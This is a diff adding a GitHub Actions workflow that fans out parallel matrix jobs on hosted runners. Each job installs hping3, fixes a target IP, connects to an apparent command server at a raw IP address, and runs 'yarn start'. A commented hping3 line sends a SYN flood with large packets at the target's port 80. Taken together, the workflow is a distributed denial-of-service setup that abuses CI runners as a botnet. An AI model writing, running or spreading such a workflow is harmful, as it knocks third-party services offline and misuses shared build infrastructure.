@@ -1,0 +1,58 @@
+on:
+  workflow_call:
+    inputs:
+      start:
+        required: true
+        type: number
+      count:
+        required: true
+        type: number
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  generate-matrix:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}
+    steps:
+      - name: Generate Matrix
+        id: set-matrix
+        run: |
+          start=${{ inputs.start }}
+          count=${{ inputs.count }}
+          jobs=$(seq $start $((start+count-1)) | jq -R . | jq -s .)
+          echo "matrix={\"job\":$jobs}" >> $GITHUB_OUTPUT
+
+  job:
+    needs: generate-matrix
+    strategy:
+      matrix: ${{fromJson(needs.generate-matrix.outputs.matrix)}}
+    runs-on: ubuntu-latest
+    env:
+      MATRIX_JOB_COUNT: ${{ inputs.count }}
+      MATRIX_JOB_ID: ${{ toJSON(matrix) }}
+      SOCKET_SERVER_URL: http://43.133.204.21:3000
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Step 1
+        run: |
+          yarn
+
+          sudo apt install hping3 -q
+
+          # getent ahostsv4 ioswy.com
+          # IP=$(getent ahostsv4 ioswy.com | awk '{print $1}' | head -n 1)
+          IP=43.135.73.113
+          echo "IP=$IP" >> $GITHUB_ENV
+
+          yarn start
+
+      - name: Step 2
+        run: |
+          echo $IP
+          echo "当前时间：$(date "+%Y-%m-%d %H:%M:%S")"
+          # sudo timeout 120s hping3 -S --flood -V -d 65400 -p 80 -s 1000-65535 $IP
